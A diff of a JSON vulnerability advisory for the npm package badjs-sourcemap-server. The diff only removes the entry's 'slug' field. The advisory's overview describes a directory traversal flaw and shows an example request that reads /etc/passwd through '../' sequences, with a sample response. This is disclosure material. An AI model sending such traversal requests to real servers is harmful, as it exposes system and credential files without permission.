@@ -9,7 +9,6 @@
   "cves": [],
   "vulnerable_versions": "<99.999.9999",
   "patched_versions": "<0.0.0",
-  "slug": "badjs-sourcemap-server_directory-traversal",
   "overview": "`badjs-sourcemap-server` recieves files sent by `badjs-sourcemap`.\n\n`badjs-sourcemap-server` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.\n\nExample request:\n```\nGET /../../../../../../etc/passwd HTTP/1.1\nhost:localhost\n```\nand response:\n```\nHTTP/1.1 200 OK\nDate: Wed, 17 May 2017 22:59:49 GMT\nConnection: keep-alive\nTransfer-Encoding: chunked\n\n{content of /etc/passwd}\n```",
   "recommendation": "Because there is no fix for this module, we recommend using a different one.",
   "references": "* [PoC by Liang Gong](https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/badjs-sourcemap-server)",
